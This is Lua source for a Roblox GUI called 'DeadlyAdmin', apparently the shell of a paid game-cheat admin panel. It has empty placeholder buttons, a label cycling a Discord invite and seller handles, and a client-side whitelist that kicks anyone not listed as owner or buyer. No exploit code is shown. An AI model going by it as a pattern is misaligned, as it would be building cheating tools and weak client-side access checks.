randomscript6.TextScaled = true
randomscript6.TextSize = 14.000
randomscript6.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
randomscript6.TextStrokeTransparency = 0.000
randomscript6.TextWrapped = true
randomscript6.MouseButton1Click:connect(function()
	-- script goes here
end)

randomscript4.Name = "randomscript4"
randomscript4.Parent = MainGUI
randomscript4.BackgroundColor3 = Color3.fromRGB(53, 53, 255)
randomscript4.BackgroundTransparency = 1.000
randomscript4.BorderColor3 = Color3.fromRGB(255, 0, 0)
randomscript4.Position = UDim2.new(0.543735206, 0, 0.783653915, 0)
randomscript4.Size = UDim2.new(0, 159, 0, 32)
randomscript4.Font = Enum.Font.SourceSans
randomscript4.Text = "Coming Soon..."
randomscript4.TextColor3 = Color3.fromRGB(0, 0, 0)
randomscript4.TextScaled = true
randomscript4.TextSize = 14.000
randomscript4.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
randomscript4.TextStrokeTransparency = 0.000
randomscript4.TextWrapped = true
randomscript4.MouseButton1Click:connect(function()
	-- script goes here
end)

promote.Name = "promote"
promote.Parent = MainGUI
promote.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
promote.BorderColor3 = Color3.fromRGB(255, 0, 0)
promote.Position = UDim2.new(-1.428, 0,-0.786, 0)
promote.Size = UDim2.new(0, 497, 0, 65)
promote.Font = Enum.Font.SourceSans
promote.Text = "N/A"
promote.TextColor3 = Color3.fromRGB(0, 0, 0)
promote.TextScaled = true
promote.TextSize = 14.000
promote.TextStrokeColor3 = Color3.fromRGB(94, 255, 7)
promote.TextStrokeTransparency = 0.000
promote.TextWrapped = true
promote.Active = true
promote.Draggable = false

OpenGUI.Name = "OpenGUI"
OpenGUI.Parent = DeadlyAdmin
OpenGUI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OpenGUI.BackgroundTransparency = 1.000
OpenGUI.Position = UDim2.new(0.522916675, 0, 0.389434904, 0)
OpenGUI.Size = UDim2.new(0, 100, 0, 100)
OpenGUI.Visible = false

OPEN.Name = "OPEN"
OPEN.Parent = OpenGUI
OPEN.BackgroundColor3 = Color3.fromRGB(39, 115, 255)
OPEN.BorderColor3 = Color3.fromRGB(255, 0, 0)
OPEN.Position = UDim2.new(-0.320000112, 0, -2.50999999, 0)
OPEN.Size = UDim2.new(0, 125, 0, 30)
OPEN.Text = "Open"
OPEN.TextColor3 = Color3.fromRGB(255, 0, 0)
OPEN.TextScaled = true
OPEN.TextSize = 14.000
OPEN.TextStrokeColor3 = Color3.fromRGB(47, 200, 255)
OPEN.TextStrokeTransparency = 0.000
OPEN.TextWrapped = true
OPEN.Active = true
OPEN.Draggable = true
OPEN.MouseButton1Click:connect(function()
	MainGUI.Visible = true
	OpenGUI.Visible = false
end)

-- Scripts:

local function KFLQIT_fake_script() -- MainGUI.LocalScript 
	local script = Instance.new('LocalScript', MainGUI)

	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
	
	counter = 0
	
	while wait(0.1)do
	 script.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
	 
	 counter = counter + 0.01
	end
end
coroutine.wrap(KFLQIT_fake_script)()
local function DKAZ_fake_script() -- promote.LocalScript 
	local script = Instance.new('LocalScript', promote)

	print ("Gui Made By Daniel")
	
	wait(1)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
	script.Parent.Text = "Made By Daniel"
	wait(8)
	script.Parent.Text = "Add YandZ#8406 lowkey#6429"
	wait(15)
	script.Parent.Text = "Make sure to Join the Server!"
	wait(10)
	script.Parent.Text = "https://discord.gg/C2sdyV"
	wait(30)
end
coroutine.wrap(DKAZ_fake_script)()
-- whitelist
if game.Players.LocalPlayer.Name == "8hpx" then
	wait(2)
    scanning.Text = "Hello 8hpx! Happy To have you here Co-Owner! :)"
    wait(3)
OpenGUI.Visible = true
CheckPlayer.Visible = false
elseif game.Players.LocalPlayer.Name == "HaxWeak" then
	wait(5)
scanning.Text = "Hello HaxWeak! Happy to have you here Owner! :)"
wait(3)
OpenGUI.Visible = true
CheckPlayer.Visible = false
elseif game.Players.LocalPlayer.Name == "PLAYERNAME" then
	wait(5)
scanning.Text = "Hello PLAYERNAME! Happy to have you here Buyer! :)"
wait(3)
OpenGUI.Visible = true
CheckPlayer.Visible = false
elseif game.Players.LocalPlayer.Name == "PLAYERNAME2" then
	wait(5)
scanning.Text = "Hello PLAYERNAME! Happy to have you here Buyer! :)"
wait(3)
OpenGUI.Visible = true
CheckPlayer.Visible = false
elseif game.Players.LocalPlayer.Name == "WhiteH_oes2" then
	wait(2)
scanning.Text = "Hello WhiteH_oes2! Happy to have you here Daniel's Alt! :)"
wait(3)
OpenGUI.Visible = true
CheckPlayer.Visible = false
elseif game.Players.LocalPlayer.Name == "SouthSidePlayaz" then
	wait(7)
scanning.Text = "Hello SouthSidePlayaz! Happy to have you here Buyer! :)"
wait(3)
OpenGUI.Visible = true
CheckPlayer.Visible = false -- 
elseif game.Players.LocalPlayer.Name == "AlphaBanners" then
	wait(7)
scanning.Text = "Hello AlphaBanners! Happy to have you here Buyer! :)"
wait(3)
OpenGUI.Visible = true
CheckPlayer.Visible = false -- 
elseif game.Players.LocalPlayer.Name == "amirrr21494" then
	wait(6)
scanning.Text = "Hello amirrr21494! Happy to have you here Buyer! :)"
wait(4)
OpenGUI.Visible = true
CheckPlayer.Visible = false -- 
elseif game.Players.LocalPlayer.Name == "Blacklisted" then
	game.Players.LocalPlayer:kick("You are Blacklisted from this admin")
else
	game.Players.LocalPlayer:kick("You are not whitelisted please contact YandZ#8406 or lowkey#6429")
end
